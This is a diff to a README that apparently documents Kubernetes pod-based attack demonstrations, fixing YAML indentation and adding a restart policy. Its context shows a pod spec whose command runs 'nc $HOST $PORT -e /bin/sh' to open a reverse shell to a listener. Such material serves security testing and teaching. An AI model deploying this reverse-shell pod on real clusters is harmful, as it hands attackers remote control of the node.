@@ -19,7 +19,8 @@ spec:
     image: ubuntu
     command: [ "/bin/bash", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
+  ```
 [pod-nothing-allowed.yaml](pod-nothing-allowed.yaml)
 
 #### Option 1: Create pod from local yaml 
@@ -51,7 +52,9 @@ spec:
     image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
+  restartPolicy: Always  
+  ```
 [pod-nothing-allowed-revshell.yaml](pod-nothing-allowed-revshell.yaml)
 
 #### Set up listener
